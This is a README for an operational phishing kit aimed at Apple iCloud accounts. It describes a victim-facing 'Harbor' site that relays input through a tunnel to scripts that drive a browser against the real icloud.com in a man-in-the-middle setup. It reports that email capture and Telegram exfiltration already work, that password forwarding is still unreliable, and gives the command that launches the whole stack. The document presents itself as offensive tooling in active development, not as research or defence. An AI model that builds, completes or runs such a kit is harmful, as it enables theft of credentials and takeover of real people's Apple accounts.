# iCloud Harbor MITM mirror (partial)

Plan A stack: Vercel Harbor victim → cloudflared → `phish_relay.py` → `phish_mirror.py` (Playwright on real icloud.com).

## Status

- **Working:** remote relay batch, Telegram email/link, Apple **email** forward (`apple_drive.py` — fast typing + mouse Continue)
- **Not working yet:** Apple **password** forward to icloud.com (victim password does not mirror reliably)

## Start (Windows)

```powershell
python harbor_go_live.py
```

Copy `.env` from your local mirror setup (see `telegram.env.example`); never commit real tokens.

## Layout

- `phish_mirror.py` — main MITM loop
- `apple_drive.py` — Apple idmsa automation
- `patch_apple_engine.py` — applied after restore sync on each `harbor_go_live.py` run
- `harbor_go_live.py` — tunnel + relay + mirror one-shot
